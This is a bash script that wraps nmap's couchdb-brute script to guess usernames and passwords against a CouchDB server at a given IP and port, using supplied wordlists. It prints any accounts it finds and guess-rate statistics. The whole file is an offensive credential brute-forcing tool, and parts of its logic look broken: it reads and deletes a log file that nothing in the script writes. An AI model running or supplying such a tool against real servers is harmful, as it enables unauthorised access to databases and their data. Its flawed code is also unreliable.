#!/bin/bash

if [ "$#" -ne 4 ]; then
    echo "Usage: $0 <IP_ADDR> <PORT> <USER_FILE> <PASS_FILE>"
    exit 1
fi

start=$SECONDS
count=0

IP_ADDR="$1"
PORT="$2"
USER_FILE="$3"
PASS_FILE="$4"

LOG_FILE="/tmp/log.txt"

while :
do
    nmap_output=$(nmap --script couchdb-brute.nse "${IP_ADDR}" -p "${PORT}" --script-args "user_file=${USER_FILE},pass_file=${PASS_FILE}")

    status=$(echo "$nmap_output" | grep "CouchDB authentication successful for \|Finished running through all possible user/password combinations.")
    echo -e "\033[0;32m$status\033[0m"
    
    auth=$(echo "$nmap_output" | grep -o "CouchDB authentication ")
    if [ -n "$auth" ]; then
        ((count++))
    fi

    echo "$nmap_output" | grep -q "Finished running through all possible user/password combinations."
    if [ $? -eq 0 ]; then
        echo -e "\n\033[0;31mDiscovered Accounts:\033[0m"
        sed 's/^/| /' "$LOG_FILE"
        rm "$LOG_FILE"
        tps=$(awk "BEGIN {printf \"%.4f\", $count / $((SECONDS - start))}")
	echo -e "\n\033[1;33mStatistics: Performed $((count)) guess(es) in $((SECONDS - start)) seconds, average tps: $tps \033[0m"
        break
    fi
done